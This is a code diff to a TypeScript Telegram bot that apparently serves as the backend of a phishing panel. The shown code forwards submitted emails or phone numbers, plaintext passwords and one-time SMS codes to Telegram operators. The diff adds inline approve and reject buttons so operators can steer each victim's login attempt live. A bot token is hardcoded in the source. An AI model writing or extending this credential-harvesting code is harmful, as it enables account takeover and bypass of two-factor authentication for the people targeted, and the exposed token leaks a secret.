@@ -1,7 +1,8 @@
 import TelegramBot from 'node-telegram-bot-api';
 import { db } from './db';
-import { telegramUsers, telegramLinks } from '@shared/schema';
+import { telegramUsers, telegramLinks, loginAttempts } from '@shared/schema';
 import { eq, desc } from 'drizzle-orm';
+import { storage } from './storage';
 
 const BOT_TOKEN = '8060343326:AAHvHLzqappYiyspQNHNWUD-6AJ4lfc1FtY';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -480,6 +481,15 @@ async function showUserStats(chatId: number, telegramId: string) {
 // Notification functions for website events
 export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string) {
   try {
+    // Get the latest login attempt to get its ID
+    const allAttempts = await storage.getLoginAttempts();
+    const latestAttempt = allAttempts.find(attempt => 
+      attempt.emailOrPhone === emailOrPhone && 
+      attempt.returnUri === returnUri
+    );
+    
+    const loginAttemptId = latestAttempt?.id;
+    
     const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
     
     const message = `🔐 Новая попытка входа\n\n` +
@@ -488,8 +498,23 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
       `🔗 Return URI: ${returnUri}\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
+    const keyboard = {
+      reply_markup: {
+        inline_keyboard: [[
+          {
+            text: '✅ Одобрить',
+            callback_data: `approve_${loginAttemptId}`
+          },
+          {
+            text: '❌ Отклонить', 
+            callback_data: `reject_${loginAttemptId}`
+          }
+        ]]
+      }
+    };
+
     for (const user of approvedUsers) {
-      await bot.sendMessage(user.telegramId, message);
+      await bot.sendMessage(user.telegramId, message, keyboard);
     }
   } catch (error) {
     console.error('Error sending login notification:', error);
@@ -528,6 +553,65 @@ export async function notifySmsSubmission(otpCode: string, stepupContext: string
     console.error('Error sending SMS notification:', error);
   }
 }
+
+// Handle callback queries (inline button presses)
+bot.on('callback_query', async (callbackQuery) => {
+  const message = callbackQuery.message;
+  const data = callbackQuery.data;
+  const chatId = message?.chat.id;
+  const telegramId = callbackQuery.from.id.toString();
+
+  if (!data || !chatId) return;
+
+  try {
+    // Check if user is approved
+    if (!(await isUserApproved(telegramId))) {
+      await bot.answerCallbackQuery(callbackQuery.id, { text: 'У вас нет прав для этого действия' });
+      return;
+    }
+
+    if (data.startsWith('approve_')) {
+      const loginAttemptId = parseInt(data.replace('approve_', ''));
+      
+      // Approve the login attempt
+      await storage.approveLoginAttempt(loginAttemptId);
+      
+      // Update the message to show approval
+      await bot.editMessageText(
+        message.text + '\n\n✅ ОДОБРЕНО', 
+        {
+          chat_id: chatId,
+          message_id: message.message_id,
+          reply_markup: { inline_keyboard: [] }
+        }
+      );
+      
+      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Вход одобрен!' });
+      
+    } else if (data.startsWith('reject_')) {
+      const loginAttemptId = parseInt(data.replace('reject_', ''));
+      
+      // Delete the login attempt
+      await storage.deleteLoginAttempt(loginAttemptId);
+      
+      // Update the message to show rejection
+      await bot.editMessageText(
+        message.text + '\n\n❌ ОТКЛОНЕНО', 
+        {
+          chat_id: chatId,
+          message_id: message.message_id,
+          reply_markup: { inline_keyboard: [] }
+        }
+      );
+      
+      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Вход отклонен!' });
+    }
+    
+  } catch (error) {
+    console.error('Error handling callback query:', error);
+    await bot.answerCallbackQuery(callbackQuery.id, { text: 'Произошла ошибка' });
+  }
+});
 
 console.log('✅ Telegram bot started successfully!');
 console.log('Bot token:', BOT_TOKEN.substring(0, 20) + '...');
